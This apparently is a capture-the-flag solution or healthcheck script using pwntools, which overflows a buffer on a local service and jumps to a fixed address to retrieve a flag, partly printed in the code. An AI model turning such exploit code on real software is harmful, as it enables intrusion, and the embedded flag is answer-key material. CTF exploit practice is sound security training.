#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib
from pwn import *
p = pwnlib.tubes.remote.remote('127.0.0.1', 1337)

for i in range(4):
       p.recvline()
payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
payload += p64(0x00000000004005da)
p.sendline(payload)
print(p.recv())
print(p.recvuntil('{'))
check = (p.recvuntil('}'))
print(str(check))
if 'n1C3_C4tcH_bUd}' in str(check):
        exit(0)
else:
        exit(1)
